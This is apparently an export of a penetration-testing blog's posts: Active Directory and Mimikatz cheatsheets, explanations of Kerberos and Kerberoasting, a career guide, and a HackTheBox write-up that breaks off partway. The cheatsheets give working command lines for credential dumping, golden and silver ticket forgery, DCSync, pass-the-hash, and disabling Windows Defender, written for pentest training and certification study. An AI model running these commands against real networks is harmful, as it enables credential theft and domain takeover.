[{"content":"Active Directory (AD) Cheatsheet This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.\nThis cheatsheet would help some certifications like CRTP, OSCP, PNPT, and such.\nNote: Only a subset of flags and switches, which are most commonly used, are shared. Best documentation is the code itself.\nThis is a living document. Last updated: 19 / June / 2022\nEnumeration Initial and lateral movement enumeration\nGet the Dog Out - SharpHound + BloodHound Let\u0026rsquo;s have the dog sniff things out because automated enumeration is cool\nThe tools used are - BloodHound, SharpHound.exe or SharpHound.ps1\nLeverage secure LDAP\n./SharpHound.exe --SecureLdap\rGetting all the data\n./SharpHound.exe --CollectionMethod All\rIt\u0026rsquo;s best to pull session info separately\nGathering data in a loop (default 2hrs), makes sense for sessions as they change\n./SharpHound.exe --CollectionMethod Session [--Loop] [--LoopDuration \u0026lt;HH:MM:SS\u0026gt;] [--LoopInterval \u0026lt;HH:MM:SS\u0026gt;]\rRun in a different context\n./SharpHound.exe --CollectionMethod All --LdapUsername \u0026lt;user_name\u0026gt; --LdapPassword \u0026lt;pass\u0026gt;\rSpecify domain\n./SharpHound.exe -d this.domain.local --CollectionMethod All\rNext step would be to take this data and then feed it to BloodHound GUI to finally have some fun :)\nGetting Hands Dirty - PowerView Let\u0026rsquo;s have some fun ourselves with manual enumeration.\nWe will use PowerView and some net commands to perform enumeration manually.\nAssuming that latest PowerView script (master and dev are the same) has been loaded in memory.\nDomain Enumeration Get basic information of the domain\nGet-Domain\rGet domain SID\nGet-DomainSID\rGet domain policies\nGet-DomainPolicy [-Domain \u0026lt;target\u0026gt;]\rGet domain Kerberos policy\n(Get-DomainPolicy).KerberosPolicy\rGet list of DCs\nGet-DomainController [-Domain \u0026lt;target\u0026gt;]\rGet DC IP\nnslookup \u0026lt;target_dc\u0026gt;\rForest Enumeration Get current forest\nGet-Forest\rGet a list of domains\nGet-ForestDomain [-Forest \u0026lt;target\u0026gt;]\rUser Enumeration Get a list of users\nGet-NetUser [-Domain \u0026lt;target\u0026gt;] [user_name]\rnet user /domain\rGet a count of users\n(Get-NetUser).count\rGet a list of users with some specific properties\nGet-NetUser [-Properties \u0026lt;\u0026gt;] Get a list of users with their logon counts, bad password attempts where attempts are greater than 0\nGet-NetUser | select cn, logoncounts, badpwdcount | ? {$_.badpwdcount -gt 0}\rFinding users with SPN\nGet-NetUser -SPN\rFinding users who are AllowedToDelegateTo\nGet-NetUser -TrustedToAuth\rFinding users who can be delegated\nGet-NetUser -AllowDelegation\rComputer Enumeration Get a list of computers\nGet-NetComputer [-Domain \u0026lt;target\u0026gt;] [-OperatingSystem \u0026quot;*2016*\u0026quot;] [-Properties \u0026lt;\u0026gt;]\rGet a list of computers with Unconstrained delegation\nGet-NetComputer -Unconstrained\rFinding users who are AllowedToDelegateTo\nGet-NetComputer -TrustedToAuth\rGroup Enumeration Get a list of groups in a domain\nnet group /domain\rGet a list of groups in a domain\nGet-NetGroup [-Domain \u0026lt;target\u0026gt;] [-FullData] [-GroupName \u0026quot;*admin*\u0026quot;] [-Username 'user_name']\rGet group membership\nGet-NetGroupMember [-GroupName 'group_name'] [-Recurse]\rShare Enumeration List shares user have access to\nInvoke-ShareFinder -CheckShareAccess -ErrorAction SilentlyContinue [-ComputerDomain \u0026lt;target_domain\u0026gt;]\rACL Enumeration Get resolved ACEs, optionally for a specific user/group and domain\nGet-ObjectAcl [-Identity \u0026lt;user_name\u0026gt;] [-Domain \u0026lt;target_domain\u0026gt;] -ResolveGUIDs\rGet interesting resolved ACLs\nInvoke-ACLScanner [-Domain \u0026lt;target_domain\u0026gt;] -ResolveGUIDS\rGet interesting resolved ACLs owned by specific object (ex. noobsec)\nInvoke-ACLScanner -ResolveGUIDS \\| ?{$_.IdentityReference -match 'noobsec'}\rSession Enumeration Finding sessions on a computer\nGet-NetSession [-Computer \u0026lt;comp_name\u0026gt;]\rGet who is logged on locally where\nGet-LoggedOnLocal [-ComputerName \u0026lt;comp_name\u0026gt;]\rUser Hunting Get list of machines where current user has local admin access\nFind-LocalAdminAccess [-Domain \u0026lt;target_domain\u0026gt;]\rFind machines where members of specific groups have sessions. Default: Domain Admins\nInvoke-UserHunter [-GroupName \u0026lt;group_name\u0026gt;]\rFind machines where current user has local admin access AND specific group sessions are present\nInvoke-UserHunter -CheckAccess\rLateral Movement Kerberoasting To see existing tickets\nklist\rRemove all tickets\nklist purge\rPowerView Request a kerberos service ticket for specified SPN.\nBy default output in Hashcat format\nRequest-SPNTicket -SPN \u0026quot;CIFS/target.domain.local\u0026quot; [-OutputFormat JTR]\rManually By doing it manually, ticket is generated, it requires to be extracted to crack the hash\nAdd-Type -AssemblyName System.IdentityModel\rNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026quot;CIFS/target.domain.local\u0026quot;\rDump the tickets out\nInvoke-Mimikatz -Command '\u0026quot;kerberos::list /export\u0026quot;'\rNow, crack \u0026rsquo;em\nOver-Pass the Hash Rubeus Rubeus.exe asktgt /user:USER \u0026lt; /rc4:HASH | /aes128:HASH | /aes256:HASH\u0026gt; [/domain:DOMAIN] [/opsec] /ptt\rMimikatz sekurlsa::pth /user:Administrator /domain:target.domain.local \u0026lt; /ntlm:hash | /aes256:hash\u0026gt; /run:powershell.exe\r","permalink":"http://localhost:1313/ad-cheatsheet/","title":"Active Directory Cheatsheet"},{"content":"Attacking Kerberos - Kerberoasting Introduction Kerberoasting is a very popular attack in the Active Directory realm since over 6 years now. Attacking guard dog of Hades by Tim Meddin\nOverview In any organization that is using Active Directory, the authentication process is done via Kerberos since a while now. While Kerberos is a secure network authentication protocol, there are several gaps inherently with the way it works. To read about how Kerberos works in more detail, you can read Introduction to Kerberos post. In short, it works as follows:\nStep 1: User creates an encrypted request by taking system time and encrypting it using the password hash. It sends the request to the KDC asking TGT\nStep 2: KDC takes the users password hash, attempts to decrypt the request. If successful, assumes the request came from the legitimate user. Takes the users identifiers and puts it in a packet, then encrypts the packet using KDCs\u0026rsquo; (krbtgt) own password hash and sends it to the user.\nStep 3: Once the user receives the TGT, the user can go ahead and request for service tickets to access some service within the forest by sending the TGT back to the KDC to request a service ticket.\nStep 4: Once the KDC receives the TGT, it attempts to decrypt it and if successful, assumes that the TGT is legitimate. It looks up the service requested, creates a service ticket which is encrypted using the service accounts password hash and sends this encrypted service ticket back to the user.\nStep 5: User receives the service ticket, forwards the same to the service requesting access to its resource.\nStep 6: Service receives the service ticket, attempts to decrypt the ticket and if successful, assumes that the ticket is legitimate and as per the access control lists set against the user, the service decides whether or not to provide the requested access.\nThat covers the overall flow of how a user goes from authenticating to requesting access to services in an organization.\nSecurity \u0026ldquo;Loopholes\u0026rdquo; In the entire process, from user authenticating to requesting access to services, it is good to note that nothing is sent in plaintext over the wire. Every crucial piece of information is encrypted and only the right entities can decrypt and view the contents of these encrypted packets, which is great\u0026hellip;almost.\nThere are two main security \u0026ldquo;loopholes\u0026rdquo; - validation, open access to service tickets.\nIn Kerberos, ticket validation happens at two points - TGT with KDC and service ticket with service account. In both the cases, the validation is whether the service (KDC or the service account) is able to decrypt or not and if successful, the ticket is deemed legitimate.\nAlso with the way Kerberos works, by design, any user can request for tickets for any service within the forest. This means that any user can request a service ticket for any service and extract these tickets from the memory and crack them offline a.k.a kerberoast them.\nImplications As anyone is allowed to request for tickets, this creates an opportunity for an attacker to extract tickets, crack them and leverage the service account hashes to create more tickets.\nKerberoasting is the base attack that allows creation of additional tickets. If a service account hash is cracked then service tickets are created which are known as Silver Tickets. We will get into creation of silver tickets and how they are useful later.\nAttack Now that we understand how Kerberos and kerberoasting works, let\u0026rsquo;s take a look at how could one actually go about performing this attack.\nget user list with spns -ne null 1.1. look for msDS-SupportedEncryptionTypes 1.2. you want user account and RC4 tickets\nrequest ticket\nextract ticket\ncrack em\nDefense Only understanding how the attack works helps no one, let\u0026rsquo;s take a look at how we can mitigate these kinds of attack paths. it\u0026rsquo;s good to enumerate your network as an attacker to understand whether you have such paths existing in your network. The best way would be to completely avoid these things, but we all know how well that goes. Stopping attackers to request tickets is impossible, but allowing one to move further in the network is definitely possible. We can have protection as well as detection\nprotection - long passwords, disallow rc4, modify msdssupportedencryptontypes to only aes detection - encryption downgrade (false positives), create honeypots\nReferences Fin ","permalink":"http://localhost:1313/activedirectory/kerberoast/","title":"Kerberoasting"},{"content":"Introduction to Kerberos Hi and welcome to the second post in the Active Directory series. In this post, we will start off with what kerberos even is and then dive in to understand how the authentication work. With that said, let\u0026rsquo;s get started.\nWhat is Kerberos? Kerberos is a network authentication protocol, first developed by the folks at MIT and was later adopted by Microsoft to incorporate it as their default authentication method. Although Microsoft uses Kerberos, but it no longer uses the MIT version of it, they themselves update and improve the protocol as per their own needs.\nKerberos works on the principle of shared secret and on the basis of tickets between the client and the server such that even in an insecure network the authentication takes place securely, we will soon get into how does that happen.\nAs mentioned above, Kerberos authentication is the default authentication protocol used but only when both the client and the server are in a domain. If either of them are not in the domain, then the authentication protocol used is the NTLM authentication mechanism.\nHow Does Kerberos Authentication Work? Key Terminologies Before we get into the authentication process of it, let\u0026rsquo;s first take a look at some key terminologies:\nDC : Domain Controller A DC is a server which is the top most node of any domain and is the one that allows the users in the environment to perform authentication via Kerberos.\nKDC : Key Distribution Centre A KDC is a service which is a part of the DC which is what deals with the authentication process, validates the requests coming from the users/ clients and then providing tickets for the same.\nTGT : Ticket Granting Ticket This is the initial ticket that is provided to the user/ client that enters the domain and if a successful authentication is performed. Having this ticket allows a user/ client to get more tickets (TGS), thus the name.\nTGS : Ticket Granting Service This allows a user to request service tickets to access different services in the domain\nAuthentication Process Kerberos authentication process can be divided into three parts - authenticating to the domain, requesting a service ticket, access a service\nAuthenticating to the Domain Domain authentication consist of the first two steps displayed in the diagram above. This part of the process is handled by the Authentication Service (AS) of the KDC.\nWhenever a user enter the domain and wants to log into the domain, the Kerberos authentication process will kick off. The user will start the process by taking its current system time and then encrypt the time with the hash of the user and send this to the KDC to request for a TGT. This is also known as authenticator or pre-auth data. This request is called AS-REQ.\nAs soon as the KDC receives this encrypted request, it looks up the copy of the users\u0026rsquo; hash and tries to decrypt the authenticator. If it is successful then KDC checks the system time in the request and compares it against its\u0026rsquo; own and if that time is within 5 minutes then it assumes that this is a legitimate request and from a legitimate user.\nOnce the request is validated successfully, KDC then returns two things in the response - a ticket called TGT (AS-REP), session key. The TGT consist of the SID of the user account, SIDs of the groups the user is a part of, as well as copy of the session key. The TGT is encrypted using the hash of the KDC (KRBTGT) and the session key is encrypted using the user hash.\nOnce the user receives these two items - TGT and encrypted session key, session key is decrypted by the user and both are stored in Local Security Authority (LSA) memory to be specific.\nNote: LSA is an important component of Windows which handles logons and authentication and manages security policy around the same\nRequesting Service Tickets Now that the user has the TGT as well as the session key, it can go ahead and request for service tickets to access services in the domain. This consist of the third and the fourth step of the process.\nOnce the user knows which service it wants to access, it takes the servicePrincipalName (SPN) which is mapped to the service account (a user account or machine account) being used to provide the service in the domain. It takes the session key it had received previously, creates a new authenticator (encrypting the system time with the session key) and sends the request (TGS-REQ) to the KDC along with the TGT it had received.\nThe KDC decrypts the TGT it received, extracts the session key and then decrypts the authenticator and checks the system time against time present in the authenticator and then moves on to finding the service for which the SPN was sent. If it is able to find the service, it sends a service ticket back to the user (TGS-REP).\nNote: The KDC does not validate any information in the TGT. As long as it is able to decrypt the TGT, it will assume it as a legitimate TGT.\nThis service ticket consist of the SID of the user that KDC takes from the TGT and a new session key. This is then encrypted using the hash of the service account. The user is also sent a copy of the session key along with this service ticket which is encrypted using the users hash.\nAccessing the Service Once the user receives these two pieces of information - service ticket and session key, it can move on to actually requesting the service to allow the user to access it.\nNote: KDC does not bother itself with ACLs, anyone can request service tickets for any service in the forest. Services decide whether access should be given and to what extent\nAgain, both of them are stored in the LSA memory. The user in order to request access to the service, sends the service ticket along with an authenticator. The service decrypts the service ticket using it\u0026rsquo;s hash and then extracts the session key and decrypts the authenticator. If the decryption is successful the service believes that this was sent from the KDC and is considered valid.\nThe service then checks the account SID of the user who wants to access the service and then checks and decides whether the user has required privileges to access the service or not. If it does, then the service grants access to the user to the extent of users privileges. If not, then the service access request is denied.\nSummary To summarize, a domain joined user requests for TGT by encrypting the timestamp by its hash. If the KDC is able to decrypt the request, it will assume the ticket is fine and will send a TGT to the user which is encrypted using the KRBTGT hash.\nOnce the user receives the TGT, it can request KDC for a service ticket by sending the service name and the TGT. If KDC is able to decrypt the TGT it receieved, it assumes the ticket is fine and checks the service name in its database. If it finds a match, the KDC will send a service ticket encrypted by the hash of the service account.\nThe user then forwards this encrypted service ticket to the service and if the service is able to decrypt the ticket, it assumes the ticket is ok and grants or denies the access basis the account information in the service ticket.\nFin Thank you for reading all the way through. If you have any suggestion, query, or found a mistake then please feel free to contact me.\nTake care and keep hacking!\n","permalink":"http://localhost:1313/activedirectory/kerberos-intro/","title":"Introduction to Kerberos"},{"content":"Introduction to Active Directory Prologue Hello there! Welcome to the first post in the Active Directory series, this post talks about AD in brief and does not go in detail at all. The objective of this post is to have a starting point in the series of AD related posts and can assist a person in understanding what AD is in general before learning about either attacks or defenses in AD. With that being said, let\u0026rsquo;s get started.\nActive Directory Overview Active Directory (AD) or as Microsoft calls it Active Directory Domain Services (AD DS) is a directory service which holds all the information about the environement and supports the network and its users in various forms. Think of it as a yellow pages book but for the organizations\u0026rsquo; network. It holds different kinds of information about the organization such as users, groups, computers, access control lists, passwords of the users, and other supporting information.\nIn essence, AD is a centralized database which provides information via Lightweight Directory Access Protocol (LDAP) and is the backbone of many dependant applications/ services which accesses this information via LDAP.\nAttributes of an Active Directory environment: Schema In order to store and manage the information about various objects in the AD, there is a definition or a set of rules that are defined according to which the data must be loaded against any object in the environment.\nGlobal catalog As the name suggests, this consist of information about any object in the domain, and is available \u0026ldquo;globally\u0026rdquo;. This means that a user can access information regardless in which domain the data resides (within the forest, by default)\nQuerying and index mechanism For an AD to function and provide support to its\u0026rsquo; dependant applications (like Kerberos or DNS), it is essential that they as well as the users can query information that is present and perform their necessary activities.\nReplication In an AD, there are usually more than one Domain Controllers. Best practice suggets that you should have at least 2 in your forest. In order for a DC to maintain a complete copy of all the required information, the replication service assist them in doing so. If any change is made in either of the DCs, the other DC performs replication to obtain this new information and stays up-to-date.\nActive Directory Structure Let\u0026rsquo;s understand the structure of an Active Directory environment.\nAn AD environment is a tiered/hierarchical structure. In this, the Forest is the top most logical \u0026ldquo;container\u0026rdquo; and is considered as the security boundary. In an organization, there could be more than one forest, and each forest consist of one or more Trees. A tree is a \u0026ldquo;container\u0026rdquo; for one or more Domains in the AD.\nAn AD environment follows a parent-child relationship. This makes Forest as the parent to Trees, which individually are a parent to their respective Domains.\nWe can take the example of URLs to understand this better. Let\u0026rsquo;s say the Forest is called example.com. In the organization you have different departments, and so you decided to make a container for them to work within. These containers, or Trees, would look like - sales.example.com, hr.example.com, finance.example.com, etc. Taking sales Tree, the Domains within it would look like north.sales.example.com, south.sales.example.com, etc.\nAD leverages the same thing as above to label domains in different levels of the forest.\nTrust As mentioned before, a parent-child relationship is followed in an AD environment.\nThis means that within a forest, there is an inherent and transitive two-way trust relationship present between the top most node (DC of the top most domain) to the bottom most node of the forest.\nThis inherent trust only exists within the forest, and not between forests. A forest acts as a perimeter with the AD, and this is known as the security boundary, where objects from one forest can not access resources/ information from another forest or vice versa by default.\nIn order to operate between multiple forests, explicit trust needs to be established and it is necessary to specify whether this trust is a two-way or one-way trust relationship.\nFin I hope this provided a base level understanding regarding AD. The topics touched over here would be expanded upon if and when required. In you have any suggestions, queries, or found a mistake, please feel free to contact me.\nTake care and keep hacking!\nWould like to keep reading? Read the next post - Introduction to Kerberos\n","permalink":"http://localhost:1313/activedirectory/ad-intro/","title":"Introduction to Active Directory"},{"content":"CRTP Cheatsheet This cheatsheet corresponds to an older version of PowerView deliberately as this is the version that was used in Pentester Academys\u0026rsquo; CRTP certification course. Updated AD enumeration (PowerView/SharpHound) cheatsheet can be found at AD Enumeration\nHelpful Commands Commands to help use PowerView even better.\nCommand Description Set-MpPreference -DisableRealTimeMonitoring $true Disable Windows Defender real time monitoring Set-MpPreference -DisableIOAVProtection $true Disable Windows Defender scanning for all files downloaded Disabling Defender even if for a small amount of time puts the assets at risk, instead one could opt for bypassing AMSI using this resource.\nRecon General Domain Enumeration Command Description Get-NetDomain [-Domain \u0026lt;target\u0026gt;] Get basic information of the domain Get-DomainSID Get the domains\u0026rsquo; SID Get-DomainPolicy [-Domain \u0026lt;target\u0026gt;] Get list of policies in the domain (Get-DomainPolicy).\u0026quot;kerberos policy\u0026quot; Get the Kerberos policy Get-NetDomainController [-Domain \u0026lt;target\u0026gt;] Get list of domain controllers User Enumeration Command Description Get-NetUsers [-Username \u0026lt;username\u0026gt;] Get a list of users Get-UserProperty [-Properties \u0026lt;property\u0026gt;] Gets a list of all user properties. Select a property to get its\u0026rsquo; value of every user (Get-NetUsers | select name).count Get a count of users present Get-NetUsers | select name,badpwdcount | where badpwdcount Get-UserProperty alternative Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending Get users sorted with most logoncounts Get-LoggedOnLocal [-ComputerName \u0026lt;name\u0026gt;] Get who is logged on locally where Computer Enumeration Command Description Get-NetComputer [-FullData] [-Ping] [-OperatingSystem \u0026quot;*server*\u0026quot;] [-Domain \u0026lt;target\u0026gt;] Get a list of all the computer OUs Get-NetComputer -FullData | select name,logoncount,operatingsystem,badpwdcount Get list of computers with required info Group Enumeration Command Description Get-NetGroup [-Domain \u0026lt;target\u0026gt;] [-FullData] [-GroupName \u0026quot;*admin*\u0026quot;] [-Username 'user_name'] Get AD groups data either all or of a user Get-NetGroupMember [-GroupName 'group_name'] [-Recurse] Get members of a group Share Enumeration Command Description Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint Find interesting shares GPO Enumeration Command Description Get-NetGPO [-ComputerName \u0026lt;hostname.domain\u0026gt;] List all GPOs in the domain Get-NetGPOGroup Find interesting GPOs Find-GPOComputerAdmin [-ComputerName \u0026lt;FQDN_computer\u0026gt;] List users of local group using GPO OU Enumeration Command Description Get-NetOU [-FullData] Get OUs (Get-NetOU -Name 'test').gplink Get gplink of an OU to get GPOs applied to it Get-NetGPO -GPOName '{asd21321asdsd3as2d1}' Get GPO of a gplink ((Get-NetOU -FullData \u0026lt;OU_NAME\u0026gt;).gplink -split \u0026quot;cn=\u0026quot; -split \u0026quot;,\u0026quot;)[1] | Get-NetGPO Get GPO of an OU using gplink ACL Enumeration Command Description Get-ObjectAcl [-Name 'domain admins'] -ResolveGUIDS Get the ACEs for a group Invoke-ACLScanner -ResolveGUIDS Find interesting ACEs Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'svcadmin'} Find interesting rights owned by \u0026lsquo;svcadmin\u0026rsquo; (can be done for groups) Trust Enumeration Command Description Get-NetDomainTrust [-Domain \u0026lt;target\u0026gt;] Map all the domain trusts Get-NetForest [-Forest \u0026lt;target\u0026gt;] Get information about the specified forest Get-NetForestDomain [-Forest \u0026lt;target\u0026gt;] Get all the domains of a forest User Hunting Command Description Find-LocalAdminAccess Get list of all machines where current user has local admin access Invoke-EnumerateLocalAdmin Find all admins on all computers Invoke-UserHunter [-GroupName \u0026lt;group_name\u0026gt;] [-CheckAccess] Find machines where a domain admin has a session, checkaccess tells you if you also have access to that machine Finding Sessions Command Description Get-NetSession [-ComputerName \u0026lt;comp_name\u0026gt;] Get list of active sessions on a system Get-LoggedOnLocal [-ComputerName \u0026lt;comp_name\u0026gt;] Get list of users logged on a system Privilege Escalation Command Description Get-NetComputer -Unconstrained Find computers to perform uncontrained delegation ","permalink":"http://localhost:1313/crtp-cheatsheet/","title":"CRTP Cheatsheet"},{"content":"Mimikatz Cheatsheet Dump Creds Invoke-Mimikatz -DumpCreds\rInvoke-Mimikatz -DumpCreds -ComputerName @(\u0026quot;server1\u0026quot;,\u0026quot;server2\u0026quot;)\rOver Pass The Hash Invoke-Mimikatz -Command \u0026quot;sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:\u0026lt;ntlm_hash\u0026gt; /run:powershell.exe\u0026quot;\rDump Hashes Invoke-Mimikatz -Command '\u0026quot;lsadump::lsa /patch\u0026quot;' -ComputerName dcorp-dc\rCreating Tickets Create A Golden Ticket Invoke-Mimikatz -Command '\u0026quot;kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:\u0026lt;domain_SID\u0026gt; /krbtgt:\u0026lt;NTLM_hash\u0026gt; id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\u0026quot;'\rCreate A Silver Ticket Invoke-Mimikatz -Command '\u0026quot;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt\u0026quot;'\rDCSync Attack DA privileges required!\nInvoke-Mimikatz -Command '\u0026quot;lsadump::dcsync /user:dcorp\\krbtgt\u0026quot;' ","permalink":"http://localhost:1313/mimikatz-cheatsheet/","title":"mimikatz-cheatsheet"},{"content":"Getting Into Cybersecurity - Red Team Edition Introduction I came across this question and was asked so often that I decided to turn it into a blog post.\nSince finance is one of the biggest barrier that one could face, every resource listed here will be either completely free or at least provide a good amount of free resources/content.\nDisclaimer The following suggestions will be more towards getting into penetration testing or red teaming but if that is not your thing or rather you do not know what your thing is I would highly recommend reading through Lesley Carharts\u0026rsquo; Starting an InfoSec Career - The Megamix series. The series is quite extensive and you would also get a look at different specializations in infosec from the amazing people who are working in it; it is fantastic. Also, Lesley is one of the most talented person in the infosec community and you gotta follow her on Twitter.\nI have myself barely just gotten my feet wet in the massive ocean that is infosec, but I know a little and would love to share whatever I know if it helps you out. In no shape or form is this gonna be THE ULTIMATE guide to follow, there are a TON of options and you must research on your own to find what works best for you ¯\\_(ツ)_/¯\nAll this will only help you get started, perhaps even make you ready for an entry level job, but that is the most all these courses, CTFs, and trainings can provide you. Not so surprisingly, experience is the most important thing in this field and is what will help you get through your future hurdles, and you will build that\u0026hellip;in time.\nWho This Post Is For? Anyone who is just starting out in the industry, not sure where to begin, basically a noob. The following suggestions are as per my experiences, these are the things I did, and it has worked out for me, clearly.\nNo IT Experience Let\u0026rsquo;s say you found this field very interesting and want to dive into it but do not have any IT or computer experience before. I would suggest doing the Google IT Support Professional Certificate from Coursera. This course will cover all the basics you need to know before you get started with cybersecurity. The course provides 7 day free trial, so hack your way through it for a free certificate :)\nLet\u0026rsquo;s Begin Ok so you decided to be a pentester, let\u0026rsquo;s get started!\nNote: None of the following needs to be done in a particular order, you can do things in any order whichever makes you feel more comfortable\nGoogle This might seem like a little obvious or feel like I\u0026rsquo;m making fun of you, I\u0026rsquo;m not. Google will be your best tool throughout your journey regardless of what you intend on doing. Learn how to look up things properly, learn some Google Dorks to look for specific things. Google every issue or doubt you come across, there is a very high chance someone else went through that too.\nNote Taking Before you start with anything, ensure that you take plenty of notes. There are a ton of notes out there, but creating your own notes and hacking sheets will help you the most. I use following applications (both are free):\nNotion - General note taking of almost everything I learn Joplin - Jotting down hack steps of each machine I tackle on HackTheBox Linux There\u0026rsquo;s no getting rid of the penguin. Ok, maybe there is, but learning Linux will open up a lot of the playground with which you can learn how to hack. Not to mention, a majority of the servers are infact Linux-based, along with almost all the IoT devices. There is a lot you can do with this.\nStart by learning the basics of Linux\nSome commands/tools that I feel you absolutely must learn are:\nvi/vim - learn from vimtutor command on Linux cut sed awk curl grep tmux - learn from here Once you\u0026rsquo;ve done that you could head on to OverTheWire and start by playing the Bandit series to not only practice Linux in a CTF-style environment but you\u0026rsquo;ll also learn some cool tricks which may help you in the future.\nOnce you have grasped the basics, you should head on to bash scripting. Bash scripting, in my opinion, is quite underrated. Linux commands can do a ton of stuff individually, and you automate it using bash scripts you can achieve pretty amazing stuff like automating your exploitation process, or even enumeration.\nYou can learn bash scripting from here\nPython I would also highly recommend learning Python. Like bash, python will come in handy in terms of automation, in some places bash will feel more \u0026ldquo;right\u0026rdquo; to use, other times python.\nYou can start learning python from here\nOne of the libraries that I would highly recommend learning is the requests library.\nPython for hacking/exploitation is no different than any other python. Python is python. You just need to apply the concepts in different ways. Some of the projects/scripts that I would recommend making are:\npingsweep portscanner bruteforcer bruteforcer bypassing CSRF tokens SQL injection automation You can achieve the same in bash :)\nOther Languages As Python can help in automating things, each language has its\u0026rsquo; own pros and cons. Other languages that you should consider learning are:\nC - Useful for general binary exploitation purposes - resource 1, resource 2 C# - Useful for Windows exploitation - Google C++ - Useful for Windows exploitation - Google PowerShell - Useful for Windows exploitation - Google Web languages that you should be able to read at the least are:\nPHP JavaScript If you\u0026rsquo;re wondering why did I not mention Java, the reason is quite simple, I absolutely despise it. If you want to you can learn it enough to be able to read it and understand what the code is doing.\nComputer Networks Learning computer networks in essential. It might feel like a lot but in time you will get a hang of it. You do not need to take a graduate level networking course or something, but you should know the following at the least:\nOSI model How TCP and UDP work TCP three way handshake Some important protocols work - HTTP, SSH (these are the ones at top of my head right now) Subnetting This YouTube playlist covers most of the topics if not all. Google things to learn more.\nTo understand the flow of connections and learn more about protocols, learn Wireshark, and tcpdump.\nWant to learn networking a little more \u0026ldquo;properly\u0026rdquo;? Go through this Guide to Network Programming\nWeb Application Exploitation With Linux, Python, and computer networks are out of the way, you now know some good amount of basics to go ahead with.\nNext you could start learning how to exploit web applications.\nThe best tool, in my opinion, that you should learn how to use as proficiently as possible is PortSwiggers\u0026rsquo; BurpSuite, which is a web proxy tool.\nOne of the best resources currently out there is PortSwiggers\u0026rsquo; Web Security Academy. It goes through a lot of web exploits which are quite realistic, you could start with XSS or SQL injection. It also provides a free lab to practice each kind of exploit.\nYou can practice your python skills here as well.\nAnother resource that you should check out is OWASP, Open Web Application Security Project. OWASP provides brilliant projects like OWASP Web Security Testing Guide and OWASP TOP 10. You should go through them thoroughly.\nYou can also leverage two different vulnerable labs to practice your web hacking skills - DVWA and OWASP Juice Shop\nYou can also practice on OverTheWire - Natas\nCapture The Flag After learning all that the only way to learn more is by hacking. Some of the CTF websites that you can get your hands dirty are:\nHackTheBox - free + paid (personal favourite) VulnHub - completely free TryHackMe - free + paid OverTheWire - completely free Hacker101 CTF - completely free Proof of Knowledge There are multiple ways of showing that you know something - certificate of completion, a social media post of \u0026ldquo;I hacked machine X\u0026rdquo;, and so on. What stands out the most is making a blog and writing about what you learned, write about something you hacked and explain the vulnerability as deep as possible and at the same time suggest remediations to fix the vulnerability.\nCreate a GitHub repo to store all your scripts there, and display those as well!\nCertifications If you\u0026rsquo;re considering getting certified or going for some certifications, I have stated which certification will provide you what:\nCompTIA Security+ : to understand the basics of security theory of different verticles (recommended) Offensive Security Certified Professional (OSCP) : a stamp that you now know the basics (recommended) Certified Ethical Hacker (CEH) : for HR purposes only Certifications are expensive, so if you do intend on getting one somehow while managing your financial problems, get only OSCP.\nFin Before you go, read this.\nI believe this is more than enough to get anyone into pentesting, if you have any doubt or suggestion, feel free to contact me :) Take care and hack the planet!\n","permalink":"http://localhost:1313/starting-point/","title":"Getting Into Cybersecurity - Red Team Edition"},{"content":"HackTheBox - Bart Writeup w/o Metasploit Introduction Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.\nWe are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a \u0026ldquo;LFI\u0026rdquo; vulnerability to poison the logs. With log poisoning we get ourselves a low privileged shell. There are two ways to escalate our privileges, both are equally straightforward. Overall the box presents various kinds of learning opportunity, let\u0026rsquo;s jump right in.\nBox Details\rReconnaissance General Enumeration We will start our reconnaissance with few Nmap scans.\nPerforming an initial Nmap scan.\nLooks like there is only one port open, port 80 - HTTP. This does not tell us much so let\u0026rsquo;s perform a targeted scan on this port and then we will perform a deep port scan.\nGreat, we got some information to work with. Looks like this is a Windows machine and the web server that is running is IIS 10.0. Seems like upon browsing to the IP of the machine, it redirects to a forum.bart.htb.\nWe can check which Windows version is running with a quick Google search:\nIt either could be Windows 10 or Windows Server 2016.\nBefore going ahead with any further web enumeration, let\u0026rsquo;s have an all port scan running in the background.\nCommand sent:\n# -T\u0026lt;number\u0026gt; : makes nmap run a lot faster but also yields a little less accurate results\rnmap -Pn -n -T4 -p- -oN nmap/allports 10.10.10.81\rNote: Ideally I would not have opted for the \u0026ldquo;faster\u0026rdquo; command but without it Nmap decided to take a good long hour to finish the scan which was annoying.\nWeb Enumeration Now that we have our all port scan running in the background, let\u0026rsquo;s start poking at this service ourselves.\nWe will start by sending a curl request to the IP.\nIt provides us with more or less the same output as the Nmap scan, which is good. It is always a good idea to check things manually than to entirely rely upon automated results.\nLet\u0026rsquo;s add the domain and sub-domain it wanted us to be redirected at to our /etc/hosts file.\nThe hosts file acts as a local DNS server with which the system can access resources within the network. Now that we have mapped the IP address to the sub-domain it wanted us to be redirected to and the domain, we should finally be able to access it.\nBurpSuite Logging Before we start any kind of manual web enumeration where we would be interacting with the web application, it is important that you keep your BurpSuite running along and ensuring that all the requests and their respective responses are being captured.\nAll of the following can be done on BurpSuite Community Edition.\nYou can copy the URLs that you want to keep in scope and paste it one after another, and ensure that only those URLs are being intercepted and logged.\nOr you could put a regex in the scope to ensure it captures everything from a particular domain.\nTo do the above you need to have \u0026ldquo;use advanced scope control\u0026rdquo; enabled, and then add the following regex which would fit for any sub-domain under bart.htb.\nOnce the scope has been added, let\u0026rsquo;s ensure we only capture the scoped requests. It\u0026rsquo;s not necessary to have your \u0026ldquo;internception\u0026rdquo; enabled, we only want to log everything we do and every request sent to the 